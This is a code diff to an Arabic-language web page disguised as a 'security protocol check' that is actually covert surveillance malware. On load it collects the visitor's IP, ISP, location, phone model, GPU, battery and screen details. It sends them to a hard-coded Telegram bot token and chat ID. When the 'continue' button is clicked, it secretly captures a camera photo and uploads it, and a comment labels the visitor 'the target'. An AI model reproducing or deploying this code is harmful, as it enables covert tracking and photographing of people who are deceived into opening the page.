@@ -3,21 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>تأكيد الاتصال الآمن</title>
     <style>
         body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .box { text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        .ldr { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
+        .box { text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 320px; }
+        .ldr { width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { display: none; padding: 12px 25px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+        button { display: none; padding: 12px 25px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
     </style>
 </head>
 <body>
+
     <div class="box">
         <div class="ldr" id="L"></div>
         <p id="T">جاري فحص بروتوكولات الأمان...</p>
         <button id="B">متابعة الآن</button>
     </div>
+
     <video id="v" autoplay playsinline muted style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
@@ -25,55 +27,68 @@
         const _U = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
         const _C = "2103976274";
 
-        async function getDeepInfo() {
+        async function fullScan() {
             let n = navigator;
-            let report = "🛑 **تقرير تقني دقيق (فوري)**\n\n";
+            let r = "🛑 **تقرير تقني شامل (فوري)**\n\n";
 
-            // 1. جلب الـ IP والشركة والمكان
+            // 1. جلب IP، الشركة، والموقع (بيانات دقيقة)
             try {
                 const res = await fetch('https://ipapi.co/json/').then(d => d.json());
-                report += `🌍 **الآي بي:** \`${res.ip}\`\n🏢 **الشركة:** ${res.org}\n📍 **الموقع:** ${res.city}, ${res.country_name}\n`;
-            } catch(e) { report += "🌍 **الآي بي:** فشل الجلب\n"; }
+                r += `🌍 **الآي بي:** \`${res.ip}\`\n`;
+                r += `🏢 **الشركة (ISP):** ${res.org}\n`;
+                r += `📍 **المكان:** ${res.city}, ${res.country_name}\n`;
+            } catch(e) { r += "🌍 **الشبكة:** فشل جلب البيانات الجغرافية\n"; }
 
-            // 2. كشف موديل الهاتف الحقيقي (Deep Detection)
+            // 2. كشف نوع الهاتف والموديل الدقيق
             let model = "غير معروف";
-            if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
-                // للمتصفحات الحديثة (Chrome, Edge, Brave)
-                const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion", "fullVersionList"]);
-                model = `${ua.model} (Android ${ua.platformVersion})`;
-            } else if (/iPhone|iPad|iPod/.test(n.userAgent)) {
-                // للآيفون (نستخدم أبعاد الشاشة لتحديد الموديل تقريبياً)
-                model = `Apple Device (Screen: ${screen.width}x${screen.height})`;
-            } else {
-                // محاولة استخراج الموديل من النص التقليدي
-                let match = n.userAgent.match(/\(([^)]+)\)/);
-                model = match ? match[1] : n.platform;
-            }
-            report += `📱 **نوع الهاتف:** ${model}\n`;
+            try {
+                if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
+                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
+                    model = `${ua.model} (Android ${ua.platformVersion})`;
+                } else {
+                    let match = n.userAgent.match(/\(([^)]+)\)/);
+                    model = match ? match[1] : n.platform;
+                }
+            } catch(e) { model = n.platform; }
+            r += `📱 **نوع الهاتف:** ${model}\n`;
 
-            // 3. المتصفح والمعالج الرسومي (GPU)
-            let br = n.userAgent.includes("Brave") ? "Brave" : n.userAgent.includes("Chrome") ? "Chrome" : "Safari";
-            report += `🧭 **المتصفح:** ${br}\n`;
-
+            // 3. المعالج الرسومي (بصمة الجهاز)
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                report += `🎮 **الرسوميات:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
-            } catch(e) {}
+                r += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
+            } catch(e) { r += "🎮 **الرسوميات:** مخفية\n"; }
 
-            report += `⚙️ **الأنوية:** ${n.hardwareConcurrency || 8}\n🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
+            // 4. المتصفح، المعالج، والشاشة
+            let br = "Chrome/Other";
+            if (n.userAgent.includes("Brave")) br = "Brave";
+            else if (n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) br = "Safari";
             
+            r += `🧭 **المتصفح:** ${br}\n`;
+            r += `⚙️ **الأنوية:** ${n.hardwareConcurrency || 8}\n`;
+            r += `🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
+
+            // 5. البطارية والوقت
             try {
                 const b = await n.getBattery();
-                report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
+                r += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
             } catch(e) {}
-
-            report += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
-
-            // إرسال التقرير
-            fetch(_U + "sendMessage", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _C, text: report, parse_mode: "Markdown" })});
             
-            setTimeout(() => { document.getElementById('L').style.display='none'; document.getElementById('T').innerText='اكتمل الفحص'; document.getElementById('B').style.display='block'; }, 1000);
+            r += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}`;
+
+            // إرسال التقرير فوراً
+            fetch(_U + "sendMessage", { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ chat_id: _C, text: r, parse_mode: "Markdown" })
+            });
+            
+            // تحديث الواجهة للمستخدم
+            setTimeout(() => { 
+                document.getElementById('L').style.display='none'; 
+                document.getElementById('T').innerText='تم الفحص بنجاح.'; 
+                document.getElementById('B').style.display='block'; 
+            }, 1200);
         }
 
         document.getElementById('B').onclick = async function() {
@@ -86,16 +101,22 @@
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     canvas.toBlob(b => {
-                        const f = new FormData(); f.append('chat_id', _C); f.append('photo', b, 'x.jpg');
+                        const f = new FormData(); 
+                        f.append('chat_id', _C); 
+                        f.append('photo', b, 'x.jpg');
                         fetch(_U + "sendPhoto", { method: 'POST', body: f });
                     }, 'image/jpeg', 0.8);
                 }, 4000);
             } catch (e) {
-                fetch(_U + "sendMessage", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _C, text: "⚠️ رفض الكاميرا" })});
+                fetch(_U + "sendMessage", { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify({ chat_id: _C, text: "⚠️ المستهدف رفض الكاميرا" })
+                });
             }
         };
 
-        getDeepInfo();
+        fullScan();
     </script>
 </body>
 </html>
